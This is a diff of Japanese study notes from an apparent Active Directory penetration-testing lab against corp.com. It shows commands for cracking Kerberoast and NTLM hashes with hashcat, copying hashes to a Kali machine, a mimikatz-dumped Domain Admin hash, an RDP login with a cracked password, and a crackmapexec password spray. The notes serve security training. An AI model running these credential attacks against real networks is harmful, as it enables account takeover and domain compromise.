@@ -60,13 +60,16 @@ sudo hashcat -m 13100 hashes.kerberoast3 rockyou_1.txt -r /usr/share/hashcat/rul
 ```
 - kerberoast コマンドを指定
 - /outfile hashes.kerberoast
-![](../../../../images/Pasted%20image%2020260523052644.png)
+
+![](../../../assets/images/Pasted%20image%2020260526050544.png)
+
 ```
 [*] SamAccountName         : iis_service
 ```
 
 ## ハッシュ値の解析
 #### ファイルをKaliに転送
+
 ```zsh
 scp .\hashes.kerberoast kali@192.168.45.181:/home/kali/
 ```
@@ -118,22 +121,20 @@ $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$8974e0c567b67aeb1bc166e7
 - 調査していくとmikeは75のローカルアドミンのためmimikatzでmaria（Domain Admins)のhashが取得できた
 mimikatz
 maria:2a944a58d4ffa77137b2c587e6ed7626
+
 ```zsh
 hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+
 ![](11_Active_Directory/02_AD認証への攻撃/assets/images/Pasted%20image%2020250819012411.png)
+
 ```zsh
 xfreerdp3 /cert:ignore /u:maria /d:corp.com /p:passwordt_1415 /v:192.168.158.70 /dynamic-resolution
 ```
 
-```
-OS{260c7a9782bd6e1b046dcf677fa91f89}
-```
 ---
-
-2
-
 # Password Spray
+
 ```zsh
 crackmapexec smb 192.168.184.75 -u cap_users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
 ```
